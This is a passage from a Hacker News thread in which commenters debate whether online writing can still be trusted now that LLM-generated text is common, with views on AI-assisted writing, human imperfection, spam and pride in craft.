me included. reply farleykr 8 hours agorootparentThis is exactly what’s at stake. I heard an artist say one time that he’d rather listen to Bob Dylan miss a note than listen to a song that had all the imperfections engineered out of it. reply herval 8 hours agorootparentThe flipside of that is the most popular artists of all time (eg Taylor Swift) do autotune to perfection, and yet more and more people love them reply kombookcha 7 hours agorootparentIf you ask a Swiftie what they love about Taylor Swift, I guarantee they will not say \"the autotune is flawless\". They're not connecting with the relative correctness of each note, but feeling a human, creative connection with an artist expressing herself. reply herval 7 hours agorootparentThey're \"creatively connecting\" to an autotuned version of a human, not to a \"flawed Bob Dylan\" reply kombookcha 7 hours agorootparentThey're not connecting to the autotune, but to the artist. People have a lot of opinions about Taylor Swift's music but \"not being personal enough\" is definitely not a common one. If you wanna advocate for unplugged music being more gratifying, I don't disagree, but acting like the autotune is what people are getting out of Taylor Swift songs is goofy. reply soco 7 hours agorootparentI have no idea about Taylor Swift so I'll ask in general: can't we have a human showing an autotuned personality? Like, you are what you are in private, but in interviews you focus on things suggested by your AI conselor, your lyrics are fine tuned by AI, all this to show a better marketable personality? Maybe that's the autotune we should worry about. Again, nothing new (looking at you, Village People) but nowadays the potential powered by AI is many orders of magnitude higher... you could say yes only until the fans catch wind of it, true, but by that time the next figure shows up and so on. Not sure where this arms escalation can lead us. Because also acceptance levels are shifting, so what we reject today as unacceptable lies could be fine tomorrow, look already at the AI influencers doing a decent job while overtly fake. reply oceanplexian 5 hours agorootparentI’m convinced it’s already being done, or at least played with. Lots of public figures only speak through a teleprompter. It would be easy to put a fine tuned LLM on the other side of that teleprompter where even unscripted questions can be met with scripted answers. reply herval 6 hours agorootparentprevyou're missing the point by a few miles reply Frost1x 7 hours agorootparentprevI think the key thing here is equating trust and truth. I trust my dog, a lot, more than most humans frankly. She has some of my highest levels of trust attainable, yet I don’t exactly equate her actions with truth. She often barks when there’s no one at the door or at false threats she doesn’t know aren’t real threats and so on. But I trust she believes it 100% and thinks she’s helping me 100%. What I think OP was saying and I agree with is that connection, that knowing no matter what was said or how flawed or what motive someone had I trusted there was a human producing the words. I could guess and reasons the other factors away. Now I don’t always know if that is the case. If you’ve ever played a multiplayer game, most of the enjoyable experience for me is playing other humans. We’ve had good game AIs in many domains for years, sometimes difficult to distinguish from humans, but I always lost interest if I didn’t know I was in fact playing and connecting with another human. If it’s just some automated system I could do that any hour of the day as much as I want but it lacked the human connection element, the flaws, the emotion, the connection. If you can reproduce that then maybe it would be enjoyable but that sort of substance has meaning to many. It’s interesting to see a calculator quickly spit out correct complex arithmetic but when you see a human do it, it’s more impressive or at least interesting, because you know the natural capability is lower and that they’re flawed just like you are. reply mvdtnz 3 minutes agorootparentprevIt's that you trusted that what you read came from a human being. Back in the day I used to spend hours reading Evolution vs Creationism debates online. I didn't \"trust\" the veracity of half of what I read, but that didn't mean I didn't want to read it. I liked reading it because it came from people. I would never want to read AI regurgitation of these arguments. reply sevensor 6 hours agorootparentprevFor me, the problem has gone from “figure out the author’s agenda” to “figure out whether this is a meaningful text at all,” because gibberish now looks a whole lot more like meaning than it used to. reply pxoe 5 hours agorootparentThis has been a problem on the internet for the past decade if not more anyway, with all of the seo nonsense. If anything, maybe it's going to be ever so slightly more readable. reply a99c43f2d565504 8 hours agorootparentprevPerhaps \"trust\" was a bit misplaced here, but I think we can all agree on the idea: Before LLMs, there was intelligence behind text, and now there's not. The I in LLM stands for intelligence, as written in one blog. Maybe the text never was true, but at least it made sense given some agenda. And like pointed out by others, the usual text style and vocabulary signs that could have been used to identify expertise or agenda are gone. reply danielmarkbruce 2 hours agorootparentThose signs are largely bs. It's a textual version of charisma. reply solidninja 5 hours agorootparentprevThere's a quantity argument to be made here - before, it used to be hard to generate large amounts of plausible but incorrect text. Now it easy. Similar to surveillance before/after smartphones + the internet - you had to have a person following you vs just soaking up all the data on the backbone. reply thesz 9 hours agorootparentprevPropaganda works by repeating the same in different forms. Now it is easier to have different forms of the same, hence, more propaganda. Also, it is much easier to iinfluence whatever people write by influencing the tool they use to write. Imagine that AI tools sway generated sentences to be slightly close, in summarisation space, to the phrase \"eat dirt\" or anything. What would happen? reply ImHereToVote 8 hours agorootparentHopefully people will exercise more judgement now that every Tom, Dick, and Harry scam artists can output elaborate prose. reply rsynnott 8 hours agorootparentprevThere are topics on which you should be somewhat suspicious of anything you read, but also many topics where it is simply improbable that anyone would spend time maliciously coming up with a lie. However, they may well have spicy autocomplete imagine something for them. An example from a few days ago: https://news.ycombinator.com/item?id=41645282 reply galactus 6 hours agorootparentprevI think it is a totally different threat. Excluding adversarial behavior, humans usually produce information with a quality level that is homogeneous (from homogeneously sloppy to homogeneously rigurous). AI otoh can produce texts that are quite accurate globally with some totally random hallucinations here and there. It makes it quite harder to identify reply baq 9 hours agorootparentprevscale makes all the difference. society without trust falls apart. it's good if some people doubt some things, but if everyone necessarily must doubt everything, it's anarchy. reply dangitman 8 hours agorootparentIs our society built on trust? I don't generally trust most of what's distributed as news, for instance. Virtually every newsroom in america is undermined by basic conflicts of interest. This has been true since long before I was born, although perhaps the death of local news has accelerated this phenomenon. Mostly I just \"trust\" that most people don't want to hurt me (even if this trust is violated any time I bike along side cars for long enough) I don't think that LLMs will change much, frankly, it's just gonna be more obvious when they didn't hire a human to do the writing. reply vouaobrasil 7 hours agorootparentprevPerhaps that anarchy is the exact thing we need to convince everyone to revolt against big tech firms like Google and OpenAI and take them down by mob rule. reply low_tech_love 4 hours agorootparentprevIt’s nothing to do with trusting in terms of being true or false, but whatever I read before I felt like, well, it can be good or bad, I can judge it, but whatever it is, somebody wrote it. It’s their work. Now when I read something I just have absolutely no idea whether the person wrote it, how much percent did they write it, or how much they even had to think before publishing it. Anyone can simply publish a perfectly well-written piece of text about any topic whatsoever, and I just can’t wrap my head around why, but it feels like a complete waste of time to read anything. Like… it’s all just garbage, I don’t know. reply everdrive 8 hours agorootparentprevHow do you like questioning much more of it, much more frequently, from many more sources? And mistrusting it in new ways. AI and regular people are not wrong in the same ways, nor for the same reasons, and now you must track this too, increasingly. reply voidmain0001 8 hours agorootparentprevI read the original comment not as a lament of not being able to trust the content, rather, they are lamenting the fact that AI/LLM generated content has no more thought or effort put into it than a cheap microwave dinner purchased from Walmart. Yes, it fills the gut with calories but it lacks taste. On second thought, perhaps AI/LLM generated content is better illustrated with it being like eating the regurgitated sludge called cud. Nothing new, but it fills the gut. reply kombookcha 9 hours agorootparentprevDebunking bullshit inherently takes more effort than generating bullshit, so the human factor is normally your big force multiplier. Does this person seem trustworthy? What else have they done, who have they worked with, what hidden motivations or biases might they have, are their vibes /off/ to your acute social monkey senses? However with AI anyone can generate absurd torrential flows of bullshit at a rate where, with your finite human time and energy, the only winning move is to reject out of hand any piece of media that you can sniff out as AI. It's a solution that's imperfect, but workable, when you're swimming through a sea of slop. reply ontouchstart 8 hours agorootparentDebugging is harder than writing code. Once the code passed linter, compiler and test, the bugs might be more subtly logical and require more effort and intelligence. We are all becoming QA of this super automated world. reply bitexploder 8 hours agorootparentprevMaybe the debunking AIs can match the bullshit generating AIs, and we will have balance in the force. Everyone is focused on the generative AIs, it seems. reply desdenova 7 hours agorootparentNo, they can't. They'll still be randomly deciding if something is fake or not, so they'll only have a probability of being correct, like all nondeterministic AI. reply nicce 8 hours agorootparentprevThere is always more money available for bullshit generation than bullshit removal. reply akudha 6 hours agorootparentprevThere were news reports that Russia spent less than a million dollars on a massive propaganda campaign targeting U.S elections and the American population in general. Do you think it would be possible before internet, before AI? Bad actors, poorly written/sourced information, sensationalism etc have always existed. It is nothing new. What is new is the scale, speed and cost of making and spreading poor quality stuff now. All one needs today is a laptop and an internet connection and a few hours, they can wreak havoc. In the past, you'd need TV or newspapers to spread bad (and good) stuff - they were expensive, time consuming to produce and had limited reach. reply kloop 1 hour agorootparentThere are lots of organizations with $1M and a desire to influence the population This can only be done with a sentiment that was, at least partially, already there. And may very well happen naturally eventually reply heresie-dabord 6 hours agorootparentprev> you trusted what you read before. For me, LLMs don't change anything. I already questioned the information before and continue to do so. [...] Why do you think that you could trust what you read before? A human communicator is, in a sense, testifying when communicating. Humans have skin in the social game. We try to educate people, we do want people to be well-informed and to think critically about what they read and hear. In the marketplace of information, we tend very strongly to trust non-delusional, non-hallucinating members of society. Human society is a social-confidence network. In social media, where there is a cloak of anonymity (or obscurity), people may behave very badly. But they are usually full of excuses when the cloak is torn away; they are usually remarkably contrite before a judge. A human communicator can face social, legal, and economic consequences for false testimony. Humans in a corporation, and the corporation itself, may be held accountable. They may allocate large sums of money to their defence, but reputation has value and their defence is not without social cost and monetary cost. It is literally less effort at every scale to consult a trusted and trustworthy source of information. It is literally more effort at every scale to feed oneself untrustworthy communication. reply eesmith 9 hours agorootparentprevThe negation of 'I cannot trust' is not 'I could always trust' but rather 'I could sometimes trust'. Nor is trust meant to mean something is absolute and unquestionable. I may trust someone, but with enough evidence I can withdraw trust. reply danielmarkbruce 2 hours agorootparentprevThe following appears to be true: If one spends a lot of years reading a lot of stuff, they come to this conclusion, that most of it cannot be trusted. But it takes lots of years and lots of material to see it. If they don't, they don't. reply tuyguntn 8 hours agorootparentprev> For me, LLMs don't change anything. I already questioned the information before and continue to do so. I also did, but LLM increased the volume of content, which forces my brain first try to identify if content is generated by LLMs, which is consuming a lot of energy and makes brain even less focused, because now it's primary goal is skimming quickly to identify, instead of absorbing first and then analyzing info reply desdenova 7 hours agorootparentThe web being polluted only makes me ignore more of it. You already know some of the more trustworthy sources of information, you don't need to read a random blog which will require a lot more effort to verify. Even here on hackernews, I ignore like 90% of the spam people post. A lot of posts here are extremely low effort blogs adding zero value to anything, and I don't even want to think whether someone wasted their own time writing that or used some LLM, it's worthless in both cases. reply escape_goat 5 hours agorootparentprevThere was a degree of proof of work involved. Text took human effort to create, and this roughly constrained the quantity and quality of misinforming text to the number of humans with motive to expend sufficient effort to misinform. Now superficially indistinguishable text can be created by an investment in flops, which are fungible. This means that the constraint on the amount of misinforming text instead scales with whatever money is resourced to the task of generating misinforming text. If misinforming text can generate value for someone that can be translated back into money, the generation of misinforming text can be scaled to saturation and full extraction of that value. reply croes 8 hours agorootparentprevThe quota changed because it's now easier and faster reply tempfile 9 hours agorootparentprev> I already questioned the information before and continue to do so. You might question new information, but you certainly do not actually verify it. So all you can hope to do is sense-checking - if something doesn't sound plausible, you assume it isn't true. This depends on having two things: having trustworthy sources at all, and being able to relatively easily distinguish between junk info and real thorough research. AI is a very easy way for previously-trustworthy sources to sneak in utter disinformation without necessarily changing tone much. That makes it much easier for the info to sneak past your senses than previously. reply desdenova 7 hours agorootparentprevExactly. The web before LLMs was mostly low effort SEO spam written by low-wage people in marketing agencies. Now it's mostly zero effort LLM-generated SEO spam, and the low-wage workers lost their jobs. reply vouaobrasil 7 hours agorootparentThe difference is that now we'll have even more zero-effort SEO spam because AI is a force multiplier for that. Much more. reply akudha 6 hours agoparentprevI was listening to an interview few months ago (forgot the name). He is a prolific reader/writer and has a huge following. He mentioned that he only reads books that are at least 50 years old, so pre 70s. That sounds like a good idea now. Even ignoring the AI, if you look at the movies and books that come out these days, their quality is significantly lower than 30-40 years ago (on an average). Maybe people's attention spans and taste is to blame, or maybe people just don't have the money/time/patience to consume quality work... I do not know. One thing I know for sure - there is enough high quality material written before AI, before article spinners, before MFA sites etc. We would need multiple lifetimes to even scratch the surface of that body of work. We can ignore mostly everything that is published these days and we won't be missing much reply eloisant 3 hours agorootparentI'd say it's probably survivor's bias. Bad books from the pre 70s are probably forgotten and no longer printed. Old books that we're still printing and are still talking about have stood the test of time. It doesn't mean that are no great recent books. reply onion2k 9 hours agoparentprevThe most depressing thing for me is the feeling that I simply cannot trust anything that has been written in the past 2 years or so and up until the day that I die. What AI is going to teach people is that they don't actually need to trust half as many things as they thought they did, but that they do need to verify what's left. This has always been the case. We've just been deferring to 'truster organizations' a lot recently, without actually looking to see if they still warrant having our trust when they change over time. reply layer8 8 hours agorootparentHow can you verify most of anything if you can’t trust any writing (or photographs, audio, and video, for that matter)? reply Frost1x 7 hours agorootparentIndependent verification is always good however not always possible and practical. At complex levels of life we have to just trust underlying processes work, usually until something fails. I don’t go double checking civil engineers work (nor could I) for every bridge I drive over. I don’t check inspection records to make sure it was recent and proper actions were taken. I trust that enough people involved know what they’re doing with good enough intent that I can take my 20 second trip over it in my car without batting an eye. If I had to verify everything, I’m not sure how I’d get across many bridges on a daily basis. Or use any major infrastructure in general where my life might be at risk. And those are cases where it’s very important to be done right, if it’s some accounting form or generated video on the internet… I have even less time to be concerned from a practical standpoint. Having the skills to do it should I want or need to are good and everyone should have these but we’re at a point in society we really have to outsource trust in a lot of cases. This is true everywhere, even in science which these days many people just trust in ways akin to faith in some cases, and I don’t see anyway around that. The key being that all the information should exist to be able to independently verify something but from a practice standpoint it’s rarely viable. reply nils-m-holm 8 hours agoparentprev> It's not so much that I think people have used AI, but that I know they have with a high degree of certainty, and this certainty is converging to 100%, simply because there is no way it will not. If you write regularly and you're not using AI, you simply cannot keep up with the competition. I am writing regularly and I will never use AI. In fact I am working on a 400+ pages book right now and it does not contain a single character that I have not come up with and typed myself. Something like pride in craftmanship does exist. reply smitelli 6 hours agorootparentI'm right there with you. I write short and medium form articles for my personal site (link in bio, follow it or don't, the world keeps spinning either way). I will never use AI as part of this craft. If that hampers my output, or puts me at a disadvantage compared to the competition, or changes the opinion others have of me, I really don't care. reply low_tech_love 4 hours agorootparentprevAmazing! Do you feel any pressure from your environment? And are you self-funded? I am also thinking about starting my first book. reply nils-m-holm 3 hours agorootparentWhat I write is pretty niche anyway (compilers, LISP, buddhism, advaita), so I do not think AI will cause much trouble. Google ranking small websites into oblivion, though, I do notice that! reply vouaobrasil 7 hours agorootparentprevNice. I will definitely consider your book over other books. I'm not interested in reading AI-assisted works. reply nyarlathotep_ 4 hours agorootparentprevIn b4 all the botslop shills tell you you're gonna get \"left behind\" if you don't pollute your output with GPT'd copypasta. reply cookingrobot 22 minutes agoparentprevIdea: we should make sure we keep track of what the human created content is, so that we don’t get confused by AI edits of everything in the future. For ex, calculate the hash of all important books, and publish that as the “historical authenticity” check. Put the hashes on some important blockchain so we know it’s unchanged over time. reply noobermin 5 hours agoparentprevWhen you're writing, how are you \"missing out\" if you're not using chatgpt??? I don't even understand how this can be unless what you're writing is already unnecessary such that you shouldn't need to write it in the first place. reply jwells89 5 hours agorootparentI don’t get it either. Writing is not something I need that level of assistance with, and I would even say that using LLMs to write defeats some significant portion of the point of writing — by using LLMs to write for me I feel that I’m no longer expressing myself in the purest sense, because the words are not mine and do not exhibit any of my personality, tendencies, etc. Even if I were to train an LLM on my style, it’d only be a temporal facsimile of middling quality, because peoples’ styles evolve (sometimes quite rapidly) and there’s no way to work around all the corner cases that never got trained for. As you say, if the subject is worth being written about, there should be no issue and writing will come naturally. If it’s a struggle, maybe one should step back and figure out why that is. There may some argument for speed, because writing quality prose does take time, but then the question becomes a matter of quantity vs. quality. Do you want to write high quality pieces that people want to read at a slower pace or churn out endless volumes of low-substance grey goo “content”? reply dotnet00 5 hours agorootparentprevLLMs are surprisingly capable editors/brainstorming tools. So, you're missing out in that you're being less efficient in editing. Like, you can write a bunch of text, then ask an LLM to improve it with minimal changes. Then, you read through its output and pick out the improvements you like. reply jayd16 4 hours agorootparentBut that's the problem. Unique, quirky mannerisms become polished out. Flaws are smoothed and over sharpened. I'm personally not as gloomy about it as the parent comments but I fear it's a trend that pushes towards a samey, mass-produced style in all writing. Eventually there will be a counter culture and backlash to it and then equilibrium in quality content but it's probably here to stay for anything where cost is a major factor. reply dotnet00 3 hours agorootparentYeah, I suppose that would be an issue for creative writing. My focus is mostly on scientific writing, where such mannerisms should be less relevant than precision, so I didn't consider that aspect of other kinds of writing. reply slashdave 3 hours agorootparentprevAnd I the only one who doesn't even like automatic grammar checkers, because they are contributing to a single and uniformly bland style of writing? LLMs are just going to make this worse. reply tourmalinetaco 4 hours agorootparentprevSure, but Grammarly and similar have existed far before the LLM boom. reply dotnet00 4 hours agorootparentThat's a fair point, I only very recently found that LLMs could actually be useful for editing, and hadn't really thought much of using tools for that kind of thing previously. reply flir 9 hours agoparentprevI've been using it in my personal writing (combination of GPT and Claude). I ask the AI to write something, maybe several times, and I edit it until I'm happy with it. I've always known I'm a better editor than I am an author, and the AI text gives me somewhere to start. So there's a human in the loop who is prepared to vouch for those sentences. They're not 100% human-written, but they are 100% human-approved. I haven't just connected my blog to a Markov chain firehose and walked away. Am I still adding to the AI smog? idk. I imagine that, at a bare minimum, its way of organising text bleeds through no matter how much editing I do. reply vladstudio 9 hours agorootparentyou wrote this comment completely by your own, right? without any AI involved. And I read your comment feeling confident that it's truly 100% yours. I think this reader's confidence is what the OP is talking about. reply flir 8 hours agorootparentI did. I write for myself mostly so I'm not so worried about one reader's trust - I guess I'm more worried that I might be contributing to the dead internet theory by generating AI-polluted text for the next generation of AIs to train on. At the moment I'm using it for local history research. I feed it all the text I can find on an event (mostly newspaper articles and other primary sources, occasionally quotes from secondary sources) and I prompt with something like \"Summarize this document in a concise and direct style. Focus on the main points and key details. Maintain a neutral, objective voice.\" Then I hack at it until I'm happy (mostly I cut stuff). Analysis, I do the other way around: I write the first draft, then ask the AI to polish. Then I go back and forth a few times until I'm happy with that paragraph. I'm not going anywhere with this really, I'm just musing out loud. Am I contributing to a tragedy of the commons by writing about 18th century enclosures? Because that would be ironic. reply ontouchstart 7 hours agorootparentIf you write for yourself, whether you use generated text or not, (I am using the text completion on my phone typing this message), the only thing that matters is how it affects you. Reading and writing are mental processes (with or without advanced technology) that shape our collective mind. reply edavison1 4 hours agoparentprev>If you write regularly and you're not using AI, you simply cannot keep up with the competition. You're out. A very HN-centric view of the world. From my perch in journalism and publishing, elite writers absolutely loathe AI and almost uniformly agree it sucks. So to my mind the most 'competitive' spheres in writing do not use AI at all. reply DrillShopper 4 hours agorootparentIt doesn't matter how elite you think you are if the newspaper, magazine, or publishing company you write for can make more money from hiring people at a fraction of your cost and having them use AI to match or eclipse your professional output. At some point the competition will be less about \"does this look like the most skilled human writer wrote this?\" and more about \"did the AI guided by a human for a fraction of the cost of a skilled human writer output something acceptably good for people to read it between giant ads on our website / watch the TTS video on YouTube and sit through the ads and sponsors?\", and I'm sorry to say, skilled human writers are at a distinct disadvantage here because they have professional standards and self respect. reply edavison1 2 hours agorootparentSo is the argument here that the New Yorker can make more money from AI slop writing overseen by low-wage overseas workers? Isn't that obviously not the case? Anyway I think I've misunderstood the context in which we're using the word 'competition' here. My response was about attitudes toward AI from writers at the tip-top of the industry rather than profit maxxing/high-volume content farm type places. reply easterncalculus 3 hours agorootparentprevExactly. Also, if the past few years is any indication, at the very least tech journalists in general tend to love to use what they hate. reply goatlover 3 hours agorootparentprevSo you're saying major media companies are going to outsource their writing to people overseas using LLMs? There is more to journalism than the writing. There's also the investigative part where journalists go and talk to people, look into old records, etc. reply edavison1 2 hours agorootparentThis has become such a talking point of mine when I'm inevitably forced to explain why LLMs can't come for my job (yet). People seem baffled by the idea that reporting collects novel information about the world which hasn't been indexed/ingested at any point because it didn't exist before I did the interview or whatever it is. reply fennecfoxy 4 hours agorootparentprevYes, but what really matters is what and how the general public, aka the consumers want to consume. I can bang on about older games being better all day long but it doesn't stop Fortnite from being popular, and somewhat rightly so, I suppose. reply jayd16 4 hours agorootparentprevSure but no one gets to avoid all but the most elite content. I think they're bemoaning the quality of pulp. reply jcd748 4 hours agoparentprevLife is short and I like creating things. AI is not part of how I write, or code, or make pixel art, or compose. It's very important to me that whatever I make represents some sort of creative impulse or want, and is reflective of me as a person and my life and experiences to that point. If other people want to hit enter, watch as reams of text are generated, and then slap their name on it, I can't stop them. But deep inside they know their creative lives are shallow and I'll never know the same. reply onemoresoop 4 hours agorootparent> If other people want to hit enter, watch as reams of text are generated, and then slap their name on it, The problem is this kind of content is flooding the internet. Before you know it becomes extremely hard to find non AI generated content... reply jcd748 4 hours agorootparentI think we agree. I hate it, and I can't stop it, but also I definitely won't participate in it. reply low_tech_love 4 hours agorootparentprevThat’s super cool, and I hope you are right and that I am wrong and artists/creators like you will still have a place in the future. My fear is that your work turns into some kind of artesanal fringe activity that is only accessible to 1% of people, like Ming vases or whatever. reply _heimdall 5 hours agoparentprev> Now, I'm not going to criticize anyone that does it, like I said, you have to, that's it. Why do you say people have to do it? People absolutely can choose not to use LLMs and to instead write their own words and thoughts, just like developers can simply refuse to build LLM tools, whether its because they have safety concerns or because they simply see \"AI\" in its current state as a doomed marketing play that is not worth wasting time and resources on. There will always be side effects to making those decisions, but its well within everyone's right to make them. reply DrillShopper 4 hours agorootparent> Why do you say people have to do it? Gotta eat, yo reply goatlover 2 hours agorootparentSomehow people made enough to eat before LLMs became all the rage a couple years ago. I suspect people are still making enough to eat without having to use LLMs. reply walthamstow 9 hours agoparentprevI've even grown to enjoy spelling and grammar mistakes - at least I know a human wrote it. reply Gigachad 9 hours agorootparentThere was a meme along the lines of people will start including slurs in their messages to prove it wasn’t AI generated. reply jay_kyburz 8 hours agorootparentA few months ago, I tried to get Gemini to help me write some criticism of something. I can't even remember what it was, but I wanted to clearly say something was wrong and bad. Gemini just could not do it. It kept trying to avoid being explicitly negative. It wanted me to instead focus on the positive. I think it evidently just told me no, and that it would not do it. reply Gigachad 8 hours agorootparentYeah all the current tools have this particular brand of corporate speech that’s pretty easy to pick up on. Overly verbose, overly polite, very vague, non assertive, and non opinionated. reply stahorn 7 hours agorootparentNext big thing: AI that writes as British football hooligans talk about the referee after a match where their team lost? reply dijit 9 hours agorootparentprevI mean, it's not a meme.. I included a few more \"private\" words than I should and I even tried to narrate things to prove I wasn't an AI. https://blog.dijit.sh/gcp-the-only-good-cloud/ Not sure what else I should do, but it's pretty clear that it's not AI written (mostly because it's incoherent) even without grammar mistakes. reply bloak 7 hours agorootparentI liked the \"New to AWS / Experienced at AWS\" cartoon. reply ipaio 9 hours agorootparentprevYou can prompt/train the AI to add a couple of random minor errors. They're trained from human text after all, they can pretend to be as human as you like. reply eleveriven 8 hours agorootparentMaking it feel like there's no reliable way to discern what's truly human reply vouaobrasil 7 hours agorootparentThere is. Be vehemently against AI, put 100% AI free in your work. The more consistent you are against AI, the more likely people will believe you. Write articles slamming AI. Personally, I am 100% against AI and I state that loud and clear on my blogs and YouTube channel. I HATE AI. reply jaredsohn 7 hours agorootparentHate to tell you but there is nothing stopping people using AI from doing the same thing. reply vouaobrasil 7 hours agorootparentAI cannot build up a sufficient level of trust, especially if you are known in person by others who will vouch for you. That web of trust is hard to break with AI. And I am one of those. reply danielbln 3 hours agorootparentAre you including transformer based translation models like Google Translate or Deepl in your categorical AI rejectio? reply vouaobrasil 3 hours agorootparentYeah. reply vasco 9 hours agorootparentprevThe funny thing is that the things it refuses to say are \"wrong-speech\" type stuff, so the only things you can be more sure of nowadays are conspiracy theories and other nasty stuff. The nastier the more likely it's human written, which is a bit ironic. reply matteoraso 8 hours agorootparentNo, you can finetune locally hosted LLMs to be nasty. reply slashdave 3 hours agorootparentMaybe the future of creative writing is fine tuning your own unique form of nastiness reply Jensson 8 hours agorootparentprev> The nastier the more likely it's human written, which is a bit ironic. This is as everything else, machine produced has a flawlessness along some dimension that humans tend to lack. reply Applejinx 8 hours agorootparentprevBarring simple typos, human mistakes are erroneous intention from a single source. You can't simply write human vagaries off as 'error' because they're glimpses into a picture of intention that is perhaps misguided. I'm listening to a slightly wonky early James Brown instrumental right now, and there's certainly a lot more error than you'd get in sequenced computer music (or indeed generated music) but the force with which humans wrest the wonkiness toward an idea of groove is palpable. Same with Zeppelin's 'Communication Breakdown' (I'm doing a groove analysis project, ok?). I can't program the AI to have intention, nor can you. If you do, hello Skynet, and it's time you started thinking about how to be nice to it, or else :) reply redandblack 2 hours agorootparentprevyesss. my thought too. All the variations of English should not lost. I enjoyed all the belter dialogue in the expanse reply 1aleksa 9 hours agorootparentprevWhenever somebody misspells my name, I know it's legit haha reply sseagull 7 hours agorootparentWay back when we had a landline and would get telemarketers, it was always a sign when the caller couldn’t pronounce our last name. It’s not even that uncommon a name, either reply fzzzy 9 hours agorootparentprevGuess what? Now the computers will learn to do that so they can more convincingly pass a turing test. reply faragon 9 hours agorootparentprevPeople could prompt for authenticity, adding subtle mistakes, etc. I hope that AI as a whole will help people writing better, if reading back the text. It is a bit like \"The Substance\" movie: a \"better\" version of ourselves. reply oneshtein 9 hours agorootparentprev> Write a response to this comment, make spelling and grammar mistakes. yeah well sumtimes spellling and grammer erors just make thing hard two read. like i no wat u mean bout wanting two kno its a reel person, but i think cleear communication is still importint! ;) reply bryanrasmussen 8 hours agoparentprev>If you write regularly and you're not using AI, you simply cannot keep up with the competition. You're out. And the growing consensus is \"why shouldn't you?\", there is no escape from that. Are you sure you don't mean if you write regularly in one particular subclass of writing - like technical writing, documentation etc.? Do you think novel writing, poetry, film reviews etc. cannot keep up in the same way? reply t-3 8 hours agorootparentI'm absolutely positive that the vast majority of fiction is or will soon be written by LLM. Will it be high-quality? Will it be loved and remembered by generations to come? Probably not. Will it make money? Probably more than before on average as the author's effort is reduced to writing outlines and prompts, and editing the generated-in-seconds output, rather than months-years of doing the writing themselves. reply lokimedes 9 hours agoparentprevI get two associations from your comment: One about how AI being mainly used to interpolate within a corpus of prior knowledge, seems like entropy in a thermodynamical sense. The other, how this is like the Tower of Babel but where distrust is sown by sameness rather than differences. In fact, relying on AI for coding and writing, feels more like channeling demonic suggestions than anything else. No wonder we are becoming skeptical. reply hyggetrold 3 hours agoparentprev> The most depressing thing for me is the feeling that I simply cannot trust anything that has been written in the past 2 years or so and up until the day that I die. This has nearly always been true. \"Manufacturing consent\" is way older than any digital technology. reply unshavedyak 3 hours agorootparentAgreed. I also suspect we've grown to rely on the crutch of trust far too much. Faulty writing has existed for ages but now suddenly because the computer is the thing making it up we have an issue with it. I guess it depends on scope. I'm imaging scientific or education. Ie things we probably shouldn't have relied on Blogs to facilitate, yet we did. For looking up some random \"how do i build a widget?\", yea AI will probably make it worse. For now. Then it'll massively improve to the point that it's not even worth asking how to build the widget. The larger \"scientific or education\" is what i'm concerned about, and i think we'll need a new paradigm to validate. We've been getting attacked on this front for 12+ years, AI is only bringing this to light imo. Trust will have to be earned and verified in this word-soup world. I just hope we find a way. reply hyggetrold 3 hours agorootparentIMHO AI tools will (or at least should!) fundamentally change the way the education system works. AI tools are - from a certain point of view - really just a scaled version of AI now can put at our fingertips. Paradoxically, the more AI can do \"grunt work\" the more we need folks to be educated on the higher-level constructs on which they are operating. Some of the bigger issues you're raising I think have less to do with technology and more to do with how our economic system is currently structured. AI will be a tremendous accelerant, but are we sure we know where we're going? reply t43562 9 hours agoparentprevIt empowers people to create mountains of shit that they cannot distinguish from shit - so they are happy. reply ks2048 9 hours agoparentprev> If you write regularly and you're not using AI, you simply cannot keep up with the competition. Is that true today? I guess it depends what kind of writing you are talking about, but I wouldn't think most successful writers today - from novelests to tech bloggers - rely that much on AI, but I don't know. Five years from now, could be a different story. reply bigstrat2003 8 minutes agorootparentIt's not true at all. Much like the claims that you have to use LLMs to keep up in programming: if that is true then you weren't a good programmer (or writer in this case) to begin with. reply theshackleford 4 hours agorootparentprevYes it’s true today, depending on what is your writing is the foundation of. It doesn’t matter that my writing is more considered, more accurate and of a higher quality when my coworkers are all openly using AI to perform five times the work I am and producing outcomes that are “good enough” because good enough is quite enough for a larger majority than many likely realise. reply vouaobrasil 7 hours agoparentprev> If you write regularly and you're not using AI, you simply cannot keep up with the competition. Wrong. I am a professional writer and I never use AI. I hate AI. reply beefnugs 2 hours agoparentprevJust add more swearing and off color jokes to everything you do and say. If there is one thing we know for sure its that the corporate AIs will never allow dirty jokes. (it will get into the dark places like spam though, which seems dumb since they know how to make meth instead, spend time on that you wankers) reply BeFlatXIII 3 hours agoparentprev> If you write regularly and you're not using AI, you simply cannot keep up with the competition. You're out. Only if you're competing on volume. reply ChrisMarshallNY 8 hours agoparentprevI don't use AI in my own blogging, but then, I don't particularly care whether or not someone reads my stuff (the ones that do, seem to like it). I have used it, from time to time, to help polish stuff like marketing fluff for the App Store, but I'd never use it verbatim. I generally use it to polish a paragraph or sentence. But AI hasn't suddenly injected untrustworthy prose into the world. We've been doing that, for hundreds of years. reply notarobot123 3 hours agorootparentI have my reservations about AI but it's hard not to notice that LLMs are effectively a Gutenberg level event in the history of written communication. They mark a fundamental shift in our capacity to produce persuasive text. The ability to speak the same language or understand cultural norms are no longer barriers to publishing pretty much anything. You don't have to understand a topic or the jargon of any given domain. You don't have to learn the expected style or conventions an author might normally use in that context. You just have to know how to write a good prompt. There's bound to be a significant increase in the quantity as well as the quality of untrustworthy published text because of these new capacities to produce it. It's not the phenomenon but the scale of production that changes the game here. reply layer8 8 hours agorootparentprev> marketing fluff for the App Store If it’s fluff, why do you put it there? As an App Store user, I‘m not interested in reading marketing fluff. reply ChrisMarshallNY 6 hours agorootparentBecause it’s required? I’ve released over 20 apps, over the years, and have learned to add some basic stuff to each app. Truth be told, it was really sort of a self-deprecating joke. I’m not a marketer, so I don’t have the training to write the kind of stuff users expect on the Store, and could use all the help I can get Over the years, I’ve learned that owning my limitations, can be even more important, than knowing my strengths. reply layer8 5 hours agorootparentMy point was that as a user I expect substance, not fluff. Some app descriptions actually provide that, but many don’t. reply ChrisMarshallNY 4 hours agorootparentWell, you can always check out my stuff, and see what you think. Easy to find. reply dijit 9 hours agoparentprevAgreed, I feel like there's an inherent nobility in putting effort into something. If I took the time to write a book and have it proof-read and edited and so on: perhaps it's actually worth my time. Lowering the bar to write books is \"good\" but increases the noise to signal ratio. I'm not 100% certain how to give another proof-of-work, but what I've started doing is narrating my blog posts - though AI voices are getting better too.. :\\ reply vasco 9 hours agorootparent> Agreed, I feel like there's an inherent nobility in putting effort into something. If I took the time to write a book and have it proof-read and edited and so on: perhaps it's actually worth my time. Said the scribe upon hearing about 